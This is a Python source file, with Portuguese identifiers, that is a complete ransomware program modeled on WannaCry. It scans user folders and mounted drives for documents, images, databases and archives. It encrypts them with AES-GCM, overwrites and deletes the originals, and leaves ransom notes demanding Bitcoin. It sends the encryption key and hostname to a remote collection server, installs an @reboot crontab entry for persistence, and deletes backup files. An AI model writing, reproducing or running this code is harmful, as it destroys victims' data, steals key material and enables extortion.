import os
import sys
import itertools
import base64
import json
import socket
import traceback
import logging
import subprocess
import tempfile
from pathlib import Path
from typing import Generator, Iterable, Union, List, Dict, Any
import secrets

# External dependencies
try:
    import requests
except ImportError:
    raise ImportError("requests library is required. Install it with 'pip install requests'.")
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    raise ImportError("cryptography library is required. Install it with 'pip install cryptography'.")


def varrer_arquivos_alvo(
    extensoes: Union[Iterable[str], None] = None,
) -> Generator[str, None, None]:
    if extensoes is None:
        extensoes = {
            ".xlsx",
            ".docx",
            ".pdf",
            ".txt",
            ".csv",
            ".jpg",
            ".png",
            ".db",
            ".backup",
            ".psd",
            ".zip",
            ".rar",
        }
    else:
        extensoes = {e.lower() if e.startswith(".") else f".{e.lower()}" for e in extensoes}

    home = os.path.expanduser("~")
    bases = [
        home,
        os.path.join(home, "Documents"),
        os.path.join(home, "Desktop"),
        os.path.join(home, "Images"),
        os.path.join(home, "Documentos_Teste"),
    ]

    if sys.platform.startswith("win"):
        bases.append("M:\\")
    else:
        bases.append("/mnt")

    vistos = set()

    def _scan_dir(caminho: str):
        try:
            with os.scandir(caminho) as it:
                for entry in it:
                    try:
                        if entry.is_dir(follow_symlinks=False):
                            real_path = os.path.realpath(entry.path)
                            if real_path not in vistos:
                                vistos.add(real_path)
                                _scan_dir(entry.path)
                        elif entry.is_file(follow_symlinks=False):
                            _, ext = os.path.splitext(entry.name)
                            if ext.lower() in extensoes:
                                yield entry.path
                    except PermissionError:
                        continue
        except PermissionError:
            return
        except FileNotFoundError:
            return

    for base in bases:
        if os.path.isdir(base):
            for caminho in _scan_dir(base):
                yield caminho


def gerar_e_armazenar_chave_maestra():
    chave = os.urandom(32)
    nonce = os.urandom(12)
    chave_b64 = base64.b64encode(chave).decode('utf-8')
    nonce_b64 = base64.b64encode(nonce).decode('utf-8')
    conteudo = f"{nonce_b64}:{chave_b64}".encode('utf-8')
    caminho = Path("/tmp/.master.key")
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    fd = os.open(caminho, flags, 0o600)
    try:
        os.write(fd, conteudo)
    finally:
        os.close(fd)
    return caminho


# Placeholder key loader – in real scenario load from file generated above
def _carregar_chave_maestra() -> bytes:
    path = Path("/tmp/.master.key")
    if not path.is_file():
        raise FileNotFoundError("Master key file not found.")
    content = path.read_text().strip()
    nonce_b64, chave_b64 = content.split(":")
    return base64.b64decode(chave_b64)


MASTER_KEY = _carregar_chave_maestra()


def _encrypt_data(data: bytes, key: bytes) -> bytes:
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    encrypted = aesgcm.encrypt(nonce, data, None)
    return nonce + encrypted


def _secure_erase(file_path: Path) -> None:
    try:
        size = file_path.stat().st_size
        with open(file_path, "r+b") as f:
            f.seek(0)
            f.write(b'\x00' * size)
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        raise RuntimeError(f"Falha ao sobrescrever o arquivo {file_path}: {e}")

    try:
        file_path.unlink()
    except Exception as e:
        raise RuntimeError(f"Falha ao remover o arquivo {file_path}: {e}")


def criptografar_arquivo(*paths: Union[str, os.PathLike]) -> None:
    for p in paths:
        file_path = Path(p).resolve()
        if not file_path.is_file():
            raise FileNotFoundError(f"Arquivo não encontrado: {file_path}")

        with open(file_path, "rb") as f:
            plaintext = f.read()

        encrypted_payload = _encrypt_data(plaintext, MASTER_KEY)

        _secure_erase(file_path)

        encrypted_path = file_path.with_suffix(".wncry")
        with open(encrypted_path, "wb") as f:
            f.write(encrypted_payload)
            f.flush()
            os.fsync(f.fileno())


def criar_nota_resgate(root_path: str, encrypted_extensions=None):
    if encrypted_extensions is None:
        encrypted_extensions = {'.enc'}

    encrypted_extensions = {
        ext.lower() if ext.startswith('.') else '.' + ext.lower()
        for ext in encrypted_extensions
    }

    for dirpath, _, filenames in os.walk(root_path, onerror=lambda e: None):
        try:
            has_encrypted = any(
                os.path.splitext(f)[1].lower() in encrypted_extensions
                for f in filenames
            )
            if not has_encrypted:
                continue

            note_path = os.path.join(dirpath, '#_LEIA_ME_WNCRY_#.txt')
            note_content = (
                "Your files have been encrypted.\n"
                "To retrieve them, you must pay 300 USD in Bitcoin to the following address:\n"
                "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
                "Contact us via the Tor network for further instructions.\n"
            )
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note_content)
        except PermissionError:
            sys.stderr.write(f"Permission denied: {dirpath}\n")
        except Exception:
            sys.stderr.write(f"Error processing {dirpath}:\n")
            traceback.print_exc(file=sys.stderr)


def exfiltrar_chave() -> Dict[str, Any]:
    path = "/tmp/.master.key"
    result: Dict[str, Any] = {"success": False}
    try:
        with open(path, "rb") as f:
            content = f.read().decode("utf-8").strip()
        parts = [p.strip() for p in content.replace("\r", "\n").split("\n") if p.strip()]
        if len(parts) >= 2:
            nonce_b64, aes_b64 = parts[0], parts[1]
        else:
            data = json.loads(content)
            aes_b64 = data.get("aes_key") or data.get("key")
            nonce_b64 = data.get("nonce")
            if not aes_b64 or not nonce_b64:
                raise ValueError("File format not recognized.")
        aes_bytes = base64.b64decode(aes_b64)
        _ = base64.b64decode(nonce_b64)
        hostname = socket.gethostname()
        payload = {
            "aes_key": base64.b64encode(aes_bytes).decode("utf-8"),
            "hostname": hostname,
        }
        url = "http://10.150.3.162:8080/collect"
        resp = requests.post(url, json=payload, timeout=10)
        resp.raise_for_status()
        os.remove(path)
        result.update({"success": True, "status_code": resp.status_code, "response": resp.text})
    except FileNotFoundError:
        result["error"] = f"File not found: {path}"
    except (base64.binascii.Error, ValueError) as e:
        result["error"] = f"Decoding error: {str(e)}"
    except requests.RequestException as e:
        result["error"] = f"HTTP request failed: {str(e)}"
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
        result["trace"] = traceback.format_exc()
    return result


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)


def _read_current_crontab() -> str:
    try:
        result = subprocess.run(
            ["crontab", "-l"],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if result.returncode not in (0, 1):
            result.check_returncode()
        return result.stdout.strip()
    except Exception as e:
        logging.error(f"Failed to read crontab: {e}")
        return ""


def _write_crontab(content: str) -> bool:
    try:
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as tf:
            tf.write(content + "\n")
            temp_name = tf.name
        subprocess.run(["crontab", temp_name], check=True)
        os.unlink(temp_name)
        return True
    except Exception as e:
        logging.error(f"Failed to write crontab: {e}")
        return False


def registrar_persistencia_crontab(script_path: str, base_dir: str) -> None:
    script_path = os.path.abspath(script_path)
    if not os.path.isfile(script_path):
        logging.error(f"Script not found: {script_path}")
        return

    entry = f"@reboot {script_path}"
    current = _read_current_crontab()
    lines = [line for line in current.splitlines() if line.strip() and not line.startswith("@reboot")]
    if entry not in lines:
        lines.append(entry)
        new_crontab = "\n".join(lines)
        if _write_crontab(new_crontab):
            logging.info(f"@reboot entry added to crontab: {entry}")
        else:
            logging.error("Could not update crontab.")
            return
    else:
        logging.info("@reboot entry already present in crontab.")

    extensions = {".bak", ".backup", ".old"}
    base_path = Path(base_dir).resolve()
    if not base_path.is_dir():
        logging.error(f"Base directory does not exist or is not a directory: {base_path}")
        return

    deleted = 0
    errors = 0
    for root, _, files in os.walk(base_path):
        for fname in files:
            if Path(fname).suffix.lower() in extensions:
                file_path = Path(root) / fname
                try:
                    file_path.unlink()
                    deleted += 1
                    logging.debug(f"Deleted: {file_path}")
                except Exception as e:
                    errors += 1
                    logging.warning(f"Failed to delete {file_path}: {e}")

    logging.info(f"Cleanup completed: {deleted} file(s) removed, {errors} error(s).")


if __name__ == "__main__":
    # 1. Gerar chave mestre
    gerar_e_armazenar_chave_maestra()
    logging.info("Chave mestre gerada e armazenada.")

    # 2. Varredura de arquivos alvo
    alvos = list(varrer_arquivos_alvo())
    logging.info(f"Encontrados {len(alvos)} arquivos alvo para criptografia.")

    # 3. Criptografar arquivos encontrados
    if alvos:
        criptografar_arquivo(*alvos)
        logging.info("Criptografia concluída.")

    # 4. Criar notas de resgate nas pastas contendo arquivos .wncry
    criar_nota_resgate(os.path.expanduser("~"), encrypted_extensions={'.wncry'})
    logging.info("Notas de resgate criadas.")

    # 5. Exfiltrar chave mestre
    resultado_exfiltracao = exfiltrar_chave()
    logging.info(f"Exfiltração de chave result: {json.dumps(resultado_exfiltracao)}")

    # 6. Registrar persistência via crontab e limpar arquivos residuais
    script_atual = os.path.abspath(__file__)
    registrar_persistencia_crontab(script_atual, os.path.expanduser("~"))
    logging.info("Persistência registrada.")